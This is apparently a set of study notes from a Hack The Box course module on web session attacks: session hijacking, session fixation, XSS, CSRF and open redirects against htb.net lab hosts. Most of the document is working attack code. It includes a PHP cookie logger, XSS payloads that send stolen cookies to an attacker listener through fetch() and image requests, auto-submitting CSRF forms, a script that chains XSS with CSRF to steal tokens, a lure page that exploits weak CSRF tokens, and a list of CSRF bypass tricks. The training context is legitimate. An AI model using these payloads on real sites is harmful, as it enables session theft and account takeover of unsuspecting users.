# Session Security

## Session Identifier storage locations

- **URL** 
- **HTML**
- **sessionStorage**
- **localStorage**

**TIP** Adding vhosts to hosts file

```bash
IP=ENTER SPAWNED TARGET IP HERE
printf "%s\t%s\n\n" "$IP" "xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net" | sudo tee -a /etc/hosts
```

## Session Hijacking

An attacker can obtain a victim's session identifier using several methods, with the most common being:

- Passive Traffic Sniffing
- Cross-Site Scripting (XSS)
- Browser history or log-diving
- Read access to a database containing session information

Replace your identifier with the victims to access their session.

## Session Fixation

Trick the victim into logging in with a previously obtained valid session identifier.
Works when session identifier: 
- is the same pre and post login.
- is accepted URL query string or post data.

### Example

If we visit ```http://insecure.exampleapp.com/login?PHPSESSID=AttackerSpecifiedCookieValue``` and find that ```AttackerSpecifiedCookieValue``` has been propagated to the cookie value there is a vulnerability.

## Obtaining Session Identifiers without User Interaction

### Obtaining Session Identifiers via Traffic Sniffing

#### Wireshark 

- Navigate to Edit -> Find Packet
- Left-click on Packet list and then click Packet bytes
- Select String on the third drop-down menu and specify auth-session on the field next to it
- Click Find
- Click Copy then Value
- Replace cookie value with the stolen one and refresh page

### Obtaining Session Identifiers Post-Exploitation (Web Server Access)

#### PHP

Find session storage location:
```bash
locate php.ini
cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
```
Then look for authenticated users session data:
```bash
ls /var/lib/php/sessions
cat //var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
```
For a hacker to hijack the user session related to the session identifier above, a new cookie must be created in the web browser with the following values:
- cookie name: PHPSESSID
- cookie value: s6kitq8d3071rmlvbfitpim9mm

### Obtaining Session Identifiers Post-Exploitation (Database Access)

```sql
show databases;
use project;
show tables;
select * from users; -- look in tables found previously
select * from all_sessions;
select * from all_sessions where id=3; -- look in specific record in a table
```

## Cross-Site Scripting (XSS)

For a Cross-Site Scripting (XSS) attack to result in session cookie leakage, the following requirements must be fulfilled:
- Session cookies should be carried in all HTTP requests
- Session cookies should be accessible by JavaScript code (the HTTPOnly attribute should be missing (check in cookies web dev tools))

Test fields with the following payloads
```js
"><img src=x onerror=prompt(document.domain)>
"><img src=x onerror=confirm(1)>
"><img src=x onerror=alert(1)>
```
dependning on what (if anything) is returned will tell you which field is vulnerable

### Obtaining session cookies through XSS

- Create a cookie-logging script
```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```
- start the listener
```bash
php -S <VPN/TUN Adapter IP>:8000
```
- update the vulnerable field with a payload
```js
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
// or
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```
- visit the updated profile page to trigger the payload

**Note:** If you're doing testing in the real world, try using something like [XSSHunter (now deprecated)](https://xsshunter.com/#/), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/#/). A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.

### Obtaining session cookies via XSS (Netcat edition)

- example payload
```js
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
// or 
<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
```
- listener
```bash
nc -nlvp 8000
```
- cookie will arrive b64 encoded because the btoa() function was used.

## Cross-Site Request Forgery (CSRF or XSRF)

A web application is vulnerable to CSRF attacks when:
- All the parameters required for the targeted request can be determined or guessed by the attacker
- The application's session management is solely based on HTTP cookies, which are automatically included in browser requests

To successfully exploit a CSRF vulnerability, we need:
- To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim
- The victim to be logged into the application at the time when the malicious cross-site request is issued

### Example

- Make a change (update profile etc)
- Intercept request
- Check for presence of anti-CSRF token
- Create a HTML file based on the form being filled out ([reference](https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Forms/Sending_and_retrieving_form_data)):
```html
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```
- serve the form
```bash
python -m http.server 1337
```
- Visit the served page in a new tab ```http://<VPN/TUN Adapter IP>:1337/notmalicious.html```
- Check original page to see if details have updated

### Cross-Site Request Forgery (GET-based)

- inspect get request with burp etc ```GET /app/save/julie.rogers@example.com?telephone=%28834%29-609-2003&country=United+States&csrf=d33c0908672c32d7a3a6bc1700ee65983b57c688&email=julie.rogers%40example.com&action=save HTTP/1.1```
-  create and serve corresponding HTML page:
```html
<!-- save as notmalicious_get.html -->
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```
```bash
python -m http.server 1337
```
- whilst user is still logged in visit ```http://<VPN/TUN Adapter IP>:1337/notmalicious_get.html```
- refresh profile page to see if updates have taken effect

### Cross-Site Request Forgery (POST-based)

- can abuse reflected URL values
- set up netcat listener
```bash
nc -nlvp 8000
```
- visit ```http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f``` where ```%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f``` is the reflected part
- listener should record the csrf token which can be used for post requests


### XSS & CSRF Chaining

- In this example we change the profiles visibility
- Use the below script to recreate changing the profiles visibility
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse; // triggers the handle response function on page load
req.open('get','/app/change-visibility',true); // get request for the change visibility page
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1]; // locates the csrf token
    var changeReq = new XMLHttpRequest(); 
    changeReq.open('post', '/app/change-visibility', true); // creates post request
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); // sets the header
    changeReq.send('csrf='+token+'&action=change'); // uses the previously aquired anti-csrf token and changes profile visibility
};
</script>
```
- Enter the script into a field vulnerable to XSS and update the profile
- Now when a different user visits that persons public profile the script will be executed and their profile visibility will change

### Exploiting Weak CSRF Tokens

- Check if hashing user names etc result in the csrf token
- Create a malicious page like below
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="never">
    <title>Proof-of-concept</title>
    <link rel="stylesheet" href="styles.css">
    <script src="./md5.min.js"></script>
</head>

<body>
    <h1> Click Start to win!</h1>
    <button class="button" onclick="trigger()">Start!</button>

    <script>
        let host = 'http://csrf.htb.net'

        function trigger(){
            // Creating/Refreshing the token in server side.
            window.open(`${host}/app/change-visibility`)
            window.setTimeout(startPoc, 2000)
        }

        function startPoc() {
            // Setting the username
            let hash = md5("crazygorilla983")

            window.location = `${host}/app/change-visibility/confirm?csrf=${hash}&action=change`
        }
    </script>
</body>
</html>
```
- and the corresponding md5.min.js script
```javascript
!function(n){"use strict";function d(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function f(n,t,r,e,o,u){return d((u=d(d(t,n),d(e,u)))<<o|u>>>32-o,r)}function l(n,t,r,e,o,u,c){return f(t&r|~t&e,n,t,o,u,c)}function g(n,t,r,e,o,u,c){return f(t&e|r&~e,n,t,o,u,c)}function v(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}function c(n,t){var r,e,o,u;n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;for(var c=1732584193,f=-271733879,i=-1732584194,a=271733878,h=0;h<n.length;h+=16)c=l(r=c,e=f,o=i,u=a,n[h],7,-680876936),a=l(a,c,f,i,n[h+1],12,-389564586),i=l(i,a,c,f,n[h+2],17,606105819),f=l(f,i,a,c,n[h+3],22,-1044525330),c=l(c,f,i,a,n[h+4],7,-176418897),a=l(a,c,f,i,n[h+5],12,1200080426),i=l(i,a,c,f,n[h+6],17,-1473231341),f=l(f,i,a,c,n[h+7],22,-45705983),c=l(c,f,i,a,n[h+8],7,1770035416),a=l(a,c,f,i,n[h+9],12,-1958414417),i=l(i,a,c,f,n[h+10],17,-42063),f=l(f,i,a,c,n[h+11],22,-1990404162),c=l(c,f,i,a,n[h+12],7,1804603682),a=l(a,c,f,i,n[h+13],12,-40341101),i=l(i,a,c,f,n[h+14],17,-1502002290),c=g(c,f=l(f,i,a,c,n[h+15],22,1236535329),i,a,n[h+1],5,-165796510),a=g(a,c,f,i,n[h+6],9,-1069501632),i=g(i,a,c,f,n[h+11],14,643717713),f=g(f,i,a,c,n[h],20,-373897302),c=g(c,f,i,a,n[h+5],5,-701558691),a=g(a,c,f,i,n[h+10],9,38016083),i=g(i,a,c,f,n[h+15],14,-660478335),f=g(f,i,a,c,n[h+4],20,-405537848),c=g(c,f,i,a,n[h+9],5,568446438),a=g(a,c,f,i,n[h+14],9,-1019803690),i=g(i,a,c,f,n[h+3],14,-187363961),f=g(f,i,a,c,n[h+8],20,1163531501),c=g(c,f,i,a,n[h+13],5,-1444681467),a=g(a,c,f,i,n[h+2],9,-51403784),i=g(i,a,c,f,n[h+7],14,1735328473),c=v(c,f=g(f,i,a,c,n[h+12],20,-1926607734),i,a,n[h+5],4,-378558),a=v(a,c,f,i,n[h+8],11,-2022574463),i=v(i,a,c,f,n[h+11],16,1839030562),f=v(f,i,a,c,n[h+14],23,-35309556),c=v(c,f,i,a,n[h+1],4,-1530992060),a=v(a,c,f,i,n[h+4],11,1272893353),i=v(i,a,c,f,n[h+7],16,-155497632),f=v(f,i,a,c,n[h+10],23,-1094730640),c=v(c,f,i,a,n[h+13],4,681279174),a=v(a,c,f,i,n[h],11,-358537222),i=v(i,a,c,f,n[h+3],16,-722521979),f=v(f,i,a,c,n[h+6],23,76029189),c=v(c,f,i,a,n[h+9],4,-640364487),a=v(a,c,f,i,n[h+12],11,-421815835),i=v(i,a,c,f,n[h+15],16,530742520),c=m(c,f=v(f,i,a,c,n[h+2],23,-995338651),i,a,n[h],6,-198630844),a=m(a,c,f,i,n[h+7],10,1126891415),i=m(i,a,c,f,n[h+14],15,-1416354905),f=m(f,i,a,c,n[h+5],21,-57434055),c=m(c,f,i,a,n[h+12],6,1700485571),a=m(a,c,f,i,n[h+3],10,-1894986606),i=m(i,a,c,f,n[h+10],15,-1051523),f=m(f,i,a,c,n[h+1],21,-2054922799),c=m(c,f,i,a,n[h+8],6,1873313359),a=m(a,c,f,i,n[h+15],10,-30611744),i=m(i,a,c,f,n[h+6],15,-1560198380),f=m(f,i,a,c,n[h+13],21,1309151649),c=m(c,f,i,a,n[h+4],6,-145523070),a=m(a,c,f,i,n[h+11],10,-1120210379),i=m(i,a,c,f,n[h+2],15,718787259),f=m(f,i,a,c,n[h+9],21,-343485551),c=d(c,r),f=d(f,e),i=d(i,o),a=d(a,u);return[c,f,i,a]}function i(n){for(var t="",r=32*n.length,e=0;e<r;e+=8)t+=String.fromCharCode(n[e>>5]>>>e%32&255);return t}function a(n){var t=[];for(t[(n.length>>2)-1]=void 0,e=0;e<t.length;e+=1)t[e]=0;for(var r=8*n.length,e=0;e<r;e+=8)t[e>>5]|=(255&n.charCodeAt(e/8))<<e%32;return t}function e(n){for(var t,r="0123456789abcdef",e="",o=0;o<n.length;o+=1)t=n.charCodeAt(o),e+=r.charAt(t>>>4&15)+r.charAt(15&t);return e}function r(n){return unescape(encodeURIComponent(n))}function o(n){return i(c(a(n=r(n)),8*n.length))}function u(n,t){return function(n,t){var r,e=a(n),o=[],u=[];for(o[15]=u[15]=void 0,16<e.length&&(e=c(e,8*n.length)),r=0;r<16;r+=1)o[r]=909522486^e[r],u[r]=1549556828^e[r];return t=c(o.concat(a(t)),512+8*t.length),i(c(u.concat(t),640))}(r(n),r(t))}function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}"function"==typeof define&&define.amd?define(function(){return t}):"object"==typeof module&&module.exports?module.exports=t:n.md5=t}(this);
//# sourceMappingURL=md5.min.js.map
```
- serve the page 
```bash
python -m http.server 1337
```
- Now send the victim the malicious link ```http://<VPN/TUN Adapter IP>:1337/press_start_2_win.html```
- If they visit it and click the start button while logged in to their profile it will be made public

### Additional CSRF Protection Bypasses

- Try making the CSRF token a null value (empty) ```CSRF-Token: ```
- Set the CSRF token value to the same length as the original CSRF token but with a different/random value
- Use the same CSRF token across accounts (if the app does not validate that the csrf token is tied to a specific account)
- Try changning the request method (POST to GET etc)
- Delete the tokens whole key value pair and send request
- If server simply checks that cookie and request parameter match (double-submit) use session fixation or:
```http
POST /change_password
Cookie: CSRF-Token=fixed_token;
POST body:
new_password=pwned&CSRF-Token=fixed_token
```
- Remove referer header if that is the protection used, add ```<meta name="referrer" content="no-referrer">``` to your page hosting the csrf script
- Bypass referer regex, if it uses target.com as a whitelist, try using the target domain as follows www.target.com.pwned.m3, www.pwned.m3?www.target.com or www.pwned.m3/www.target.com

### Open Redirect

- Possible when the legitimate application's redirection functionality does not perform any kind of validation
- Specify a website under their control in a redirection URL of a legitimate website
- Pass this URL to the victim
- Example vulnerable redirect code
```php
$red = $_GET['url'];
header("Location: " . $red);
```
- Can be manipulated by send ```trusted.site/index.php?url=https://evil.com``` to the victim
- Other URL parameters to check for:
  - ?url=
  - ?link=
  - ?redirect=
  - ?redirecturl=
  - ?redirect_uri=
  - ?return=
  - ?return_to=
  - ?returnurl=
  - ?go=
  - ?goto=
  - ?exit=
  - ?exitpage=
  - ?fromurl=
  - ?fromuri=
  - ?redirect_to=
  - ?next=
  - ?newurl=
  - ?redir=

  #### Example

  - Navigating to ```http://oredirect.htb.net``` results in ```http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>```
  - Start a netcat listener
  - Edit URL to ```http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN Adapter IP>:PORT&token=<RANDOM TOKEN ASSIGNED BY THE APP>``` and send to the victim
  - Netcat listener will capture the request and the users reset token